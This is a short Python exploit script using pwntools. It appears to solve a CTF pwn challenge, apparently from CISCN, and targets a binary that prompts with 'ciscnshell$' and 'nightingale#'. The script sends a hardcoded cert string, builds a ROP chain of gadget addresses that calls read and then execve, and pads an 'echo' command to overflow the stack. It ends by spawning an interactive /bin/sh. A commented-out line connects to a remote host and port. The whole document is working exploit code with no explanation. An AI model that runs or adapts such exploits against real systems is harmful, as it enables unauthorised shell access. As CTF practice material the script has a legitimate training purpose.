from pwn import *
context.log_level="debug"
sh=process("./pwn")
# sh=remote("123.56.135.185",17313)
cert=b'cert nAcDsMicN S33UAga1n@#!'
sh.sendlineafter(b"ciscnshell$ ", cert)

syscall=0x000000000040328c
rdi=0x0000000000444fec
rsi=0x000000000041e818
rdx=0x000000000049e11d
rax=0x000000000040d9e6
binsh=0x4C38E7
bss=0x5A34A0
ropchan=p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx)+p64(0x8)+p64(rax)+p64(0)+p64(syscall)
ropchan+=p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)
# +(p64(rdi)[:3]).ljust(8,b'+')
length= (0x210-0x13)
r=length//8
y=length%8
payload=b'echo'
for i in range(r):
    payload+=b' '
    payload+=b'a'*8
payload+=b' '+b'a'*y
payload+=b' '+b'+'*38
payload+=b' '+ropchan
gdb.attach(sh,"b *0x4C1882\nc")
sh.sendlineafter(b"nightingale# ", payload)
# input()
sleep(1)
sh.send(b"/bin/sh\x00")
sh.interactive()